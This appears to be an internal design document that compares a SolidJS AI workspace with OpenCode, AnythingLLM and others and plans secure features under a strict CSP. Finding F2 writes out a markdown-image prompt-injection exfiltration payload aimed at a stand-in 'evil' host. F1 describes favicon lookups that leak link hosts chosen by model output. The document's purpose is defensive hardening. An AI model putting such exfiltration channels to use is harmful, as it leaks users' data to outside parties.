# Capability matrix B: web workspace

Scope: the SolidJS web app in `apps/web/src` (2,243 lines including styles and locales), served by `kk-companion` over `/api/*`. Labels: VERIFIED (read in source or run), OBSERVED (seen in a listing or output), INFERRED (reasoned from what was read), ASSUMED, UNKNOWN. Nothing here was executed in a browser; every "VERIFIED" is a source read or a command run (`npm view` for licences, `grep`, `wc`).

Constraint that shapes every decision: the companion sends `default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'` (VERIFIED, `crates/kk-companion/src/app.rs:16`). So: no inline style attributes in injected HTML, no `blob:` images, no WebAssembly without `'wasm-unsafe-eval'`, no third-party origin of any kind. Anything adopted must run under this policy unchanged.

## 2. Capability matrix

How to read: Kakurega state is HAS / PARTIAL / LACKS / WORSE (a thing exists but a reference does it better or Kakurega's version is defective). Decision is REUSE (copy with notice) / ADAPT (port the pattern or file) / IMPROVE (do better than the reference because of our model) / BUILD (no usable reference) / EXCLUDE. Fit is judged against Kakurega's privacy model: no cloud accounts, one kernel, one approval path, the page is never trusted with approvals or keys, no third-party network egress.

Four findings that change decisions, all VERIFIED by source read:

- F1. OpenCode's markdown view sends every external link's host to Google. `session-ui/src/components/markdown.tsx:480-520` builds `https://www.google.com/s2/favicons?domain=<host>` for any `http(s)` link in rendered markdown. The host is chosen by whoever wrote the text, so model output can make the browser request a URL on a domain of its choosing, with data encoded in the domain label. Separately `sources/site-icon.tsx:27` requests `https://<host>/favicon.ico`. AnythingLLM does the same through Google (`Citation/index.jsx`, favicon URL built from the link hostname). Both must be excluded, and our CSP (`img-src 'self' data:`) would block them even if copied.
- F2. OpenCode's sanitiser (`markdown-cache.tsx:38-60`) only neutralises local file paths on `img`; an `https:` image keeps its `src` and loads. That is the classic prompt-injection exfiltration channel (`![](https://evil/?q=...)`). Kakurega currently renders model text as plain text (`Chat.tsx:46`, `Documents.tsx:56`), so it is safe today, and adopting a markdown renderer without a remote-image rule would introduce the hole.
- F3. Kakurega's own gaps found while reading: the chat Enter handler has no IME-composition guard (`Chat.tsx:60-65`; matters for the shipped Hindi locale), any failure of the initial session call drops the user to the pairing screen (`App.tsx:166-168`) and later poll failures are swallowed with no visible state (`App.tsx:173-179`, `ReviewView.tsx:396-398`), no error boundary, chat is lost on reload, tab buttons lack arrow-key navigation (`ReviewView.tsx:420-422`), the companion's OS-chosen port means a normal PWA/service worker would be keyed to a new origin on every launch.
- F4. Approval UIs in the references let the browser approve: AnythingLLM sends `toolApprovalResponse` over a websocket with an "always allow" whitelist (`ToolApprovalRequest/index.jsx:35-60`), OpenCode ships `auto-approve.ts` and "allow always" (`session-permission-dock.tsx:32-45`), LibreChat has a `fullAccess` mode. All three conflict with `web-shell.md` ("approvals are never accepted from the browser session alone"). Layout is adoptable; the approve action is not.

## 3. Prioritised implementation order for the SolidJS app

Ordering rule: first what protects everything adopted afterwards, then what unblocks the rest, then user-visible value.

1. **Egress and render-safety harness (W51, W13 prerequisites).** A Playwright suite that loads every screen under the real CSP and fails on any request to an origin other than the companion, any CSP violation report, and any console error; plus an XSS and exfiltration corpus for the markdown path. Nothing from OpenCode's markdown stack is merged until this exists, because F1 and F2 show two of the three references leak by default. No library needed beyond Playwright.
2. **Event stream and resilient client (W12, W05).** SSE from `kk-companion` with sequence numbers and resume, a store in `api.ts`/a new `stores/` module, and the connection grace-period hook adapted from OpenHands `use-connection-error-grace-period.ts` and `connection-recovery-notice.tsx`. Remove the three polling timers. Add the ErrorBoundary (W38).
3. **Persistent threads in the vault (W06, W07, W15, W44, W46 groundwork).** Thread list, rename/archive/pin, append-only branching with the sibling switcher logic from LibreChat `MultiMessage.tsx`, full-text search using the multi-source/abort pattern of OpenCode `shell/commands/search.ts`, export with OpenCode's `session/commands/export.ts` filename sanitiser. Needs companion endpoints; today chat is lost on reload.
4. **Safe streaming markdown and code (W13, W14).** Adapt OpenCode `patchmark/src/*` (blocks, inline, heal, stream, html) with the F1/F2 rules, `session-ui/src/components/markdown-stream.ts`, `markdown-worker-queue.ts`, and the DOMPurify setup from `markdown-cache.tsx` minus the favicon and local-image hooks. Tokeniser via `@pierre/highlights` (Apache-2.0) only if CSP and wasm check passes; else Shiki's JS engine.
5. **Step timeline from the signed log (W19, W20, W21).** Adapt `session-ui/src/components/basic-tool.tsx` and the `TimelineRow` union from `timeline/timeline-row.ts` (without Effect), plus OpenHands' `defineVisualizer` registry (`tool-visualizers/define.ts`, `dispatcher.tsx`). Replaces `Progress` and the audit table in `ReviewView.tsx` with cards that show seq, signature state, refusal reason and expandable exact bytes.
6. **Composer, attachments, stop (W28, W16, W25, W29).** Adapt `composer/suggestions/machine.ts` (pure reducer, includes the IME `composing` guard), `composer/dropzone.tsx`, and the dedupe/classify/track logic in `composer/attachments/attachments.ts`; fix the Enter-during-composition bug in `Chat.tsx` immediately regardless. Drafts and history stored in the vault.
7. **Command palette, shortcuts, settings search (W09, W10, W33).** Adapt `shell/commands/command.tsx` (registry, keymap signatures, layout-aware key normalisation) and `settings/search-index.ts`; palette entries share ids with the terminal slash commands. Route changes and approval-mode chip are read from kernel state.
